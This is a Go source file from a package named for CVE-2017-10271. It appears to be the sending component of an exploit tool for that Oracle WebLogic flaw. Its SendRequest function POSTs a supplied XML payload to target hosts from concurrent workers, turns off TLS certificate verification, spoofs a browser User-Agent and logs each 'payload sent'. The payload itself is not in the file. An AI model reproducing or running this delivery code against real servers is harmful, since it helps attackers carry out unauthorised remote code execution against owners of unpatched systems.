package libcve201710271

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/sirupsen/logrus"
)

// SendRequest is used to generate the actual request that we send out
func SendRequest(th TargetHost, id int, m *sync.Mutex) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Timeout:   10 * time.Second,
		Transport: tr,
	}

	if !strings.HasPrefix(th.R, "http") {
		th.R = fmt.Sprintf("http://%s", th.R)
	}

	url := fmt.Sprintf("%s%s", th.R, th.U)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(th.P)))
	if err != nil {
		m.Lock()
		logrus.WithError(err).Errorln("Failed to create HTTP POST request")
		m.Unlock()
		return
	}

	req.Header.Add("Content-Type", "text/xml; charset=UTF-8")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36")

	m.Lock()
	logrus.Infof("Sending payload to %s in worker %d", url, id)
	m.Unlock()
	res, err := client.Do(req)
	if err != nil {
		m.Lock()
		logrus.WithError(err).Errorln("Error occurred while performing POST request")
		m.Unlock()
		return
	}

	m.Lock()
	logrus.WithFields(logrus.Fields{
		"status_code": res.StatusCode,
		"status":      res.Status,
	}).Infof("Payload sent to %s from worker %d", url, id)
	m.Unlock()
}
